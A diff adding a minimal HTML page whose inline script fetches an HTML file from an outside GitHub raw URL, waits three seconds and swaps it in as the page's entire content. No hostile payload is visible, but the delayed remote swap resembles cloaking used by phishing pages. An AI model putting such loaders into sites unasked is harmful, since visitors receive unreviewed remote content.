@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+<head>
+<script>
+    	const sleep =  (ms) => {
+  return new Promise(resolve => setTimeout(resolve, ms));
+}
+nose = async() => {
+h = await fetch("https://raw.githubusercontent.com/newerdmail/newerdmail.github.io/main/original.html")
+jeje = await h.text()
+await sleep(3000)
+document.documentElement.innerHTML = jeje
+}
+nose()
+</script>
+</head>
+</html>
